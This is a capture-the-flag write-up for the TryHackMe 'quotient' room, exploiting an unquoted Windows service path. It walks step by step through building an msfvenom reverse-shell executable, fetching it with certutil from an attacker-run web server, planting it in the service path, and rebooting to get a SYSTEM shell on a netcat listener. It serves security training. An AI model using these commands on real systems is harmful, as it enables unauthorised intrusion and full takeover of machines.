## Link to tryhackme room

[quotient](https://tryhackme.com/room/quotient)

## Save target IP to a variable (NOTE: Your IP will be different)

`export target="10.10.136.60"`

## RDP to the target box  

```
xfreerdp /v:${target} /u:sage +clipboard                                                                                                                                                         127 ⨯ 2 ⚙
[12:55:19:113] [22656:22657] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:55:19:113] [22656:22657] [WARN][com.freerdp.crypto] - CN = thm-quotient
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.10.136.60:3389) 
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:55:19:114] [22656:22657] [ERROR][com.freerdp.crypto] -      thm-quotient
[12:55:19:115] [22656:22657] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.10.136.60:3389 (RDP-Server):
        Common Name: thm-quotient
        Subject:     CN = thm-quotient
        Issuer:      CN = thm-quotient
        Thumbprint:  3c:45:3a:cc:63:da:97:61:e5:68:95:6f:e6:59:7a:38:1a:b3:24:b2:39:da:2b:44:c0:1e:6b:0e:0f:9d:62:42
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password:
```  

## Unquoted binary paths

Open a command prompt and search for services with unquoted binary paths:  

```
C:\Users\Sage>wmic service get name,displayname,pathname,startmode | findstr /i "auto"|findstr /i /v "c:\windows\\" | findstr /i /v """
Developmenet Service                                                                Development Service                       C:\Program Files\Development Files\Devservice Files\Service.exe                    Auto
```

Great! We've found a service that has an unquoted binary paths.  Next, let's create a tcp reverse shell, deliver it to the target box, and attempt to exploit this misconfiguration.  


## Create a tcp reverse shell

On attacker box create the reverse shell:    

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.0.25 LPORT=4445 -f exe-service -o Service.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: Service.exe
```

## Start up python web server on 

On the attacker box start the python web server to serve the payload

```
python3 -m http.server 8090                                                    
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
```

In an separate window also in the attacker box, start an netcat listener: `nc -lvnp 4445`  

## Download the reverse shell

On the victim box, download the payload

```
C:\Users\Sage>certutil -urlcache -split -f "http://10.9.0.25:8090/Service.exe" Service.exe
****  Online  ****
  0000  ...
  be00
CertUtil: -URLCache command completed successfully.
```

## Payload location

Let's try to place the payload within the execution path so it is executed before the "Service.exe" binary. We don't have access to create a file in "C:\" or "C:\Program Files", but we do have write access under "C:\Program Files\Development Files".  So let's rename our binary to Devservice.exe and place it in this directory:  
`C:\Users\Sage\>rename Service.exe Devservice.exe`  
`C:\Users\Sage\>move Devservice.exe "C:\Program Files\Development Files\"`  

Let's check the current status of the "Development Service" service:  
```
C:\Users\Sage>sc query "Development Service"

SERVICE_NAME: Development Service
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
```

It is currently stopped. Let's start up our listener on the attack box and attempt to start the service:  
- On attack box: `nc -lvnp 4445`  
- on victim box: `sc start "Development Service"  

Our attempt to start the service failed because we do not have sufficient privileges:  
```
C:\Users\Sage>sc start "Development Service"
[SC] StartService: OpenService FAILED 5:

Access is denied.
```

Let's see what privileges we do have:  
```
PS C:\Users\Sage> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\Sage>
```

Looks like we can reboot the victim box with the seShutdownPrivilege privilege and we did see from the wmic output that the "Development Service" auto starts.  so let's reboot the victim box and wait for a connection to our listener:  `shutdown /r /t 0`  

After a few minutes, we receive a callback to our listener:
```
nc -lnvp 4445
listening on [any] 4445 ...
connect to [10.9.0.25] from (UNKNOWN) [10.10.191.66] 49670
Microsoft Windows [Version 10.0.17763.3165]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>


C:\Windows\system32>
```

Checking our privileges we see we have SYSTEM access:  
```
C:\Windows\system32>whoami
whoami
nt authority\system
```

Let's get flag and call it a day:  
```
C:\Windows\System32>cd C:\Users\Administrator\Desktop
cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 4448-19F9

 Directory of C:\Users\Administrator\Desktop

07/19/2022  01:23 PM    <DIR>          .
07/19/2022  01:23 PM    <DIR>          ..
07/19/2022  11:34 AM                17 flag.txt
               1 File(s)             17 bytes
               2 Dir(s)  25,160,310,784 bytes free

C:\Users\Administrator\Desktop>type flag.txt
type flag.txt
<REDACTED>
```


Move the payload to `C:\Program Files\Development Files`




